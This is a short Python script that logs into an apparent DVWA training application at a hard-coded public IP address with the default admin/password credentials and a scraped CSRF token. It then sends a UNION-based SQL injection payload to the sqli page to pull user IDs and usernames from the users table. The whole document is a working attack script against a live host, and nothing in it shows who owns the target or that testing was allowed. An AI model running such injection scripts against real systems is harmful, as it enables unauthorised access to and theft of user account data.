
import requests
import re
from urllib.parse import quote

session = requests.Session()

# Get fresh token and login
resp = session.get("http://31.97.117.123/login.php")
match = re.search(r"user_token['\"] value=['\"](.*?)['\"]", resp.text)
token = match.group(1) if match else "574fcd28f93f57c93cb554ecaf3ca520"

# Login
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

resp = session.post("http://31.97.117.123/login.php", data=login_data)

# Extract user names - we need to figure out the column structure first
# Let's get user_id and username/first_name
payload = "999' UNION SELECT user_id, user FROM users-- -"
resp = session.get(f"http://31.97.117.123/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit")

print("Getting user IDs and usernames:")
print(resp.text[2200:3200])

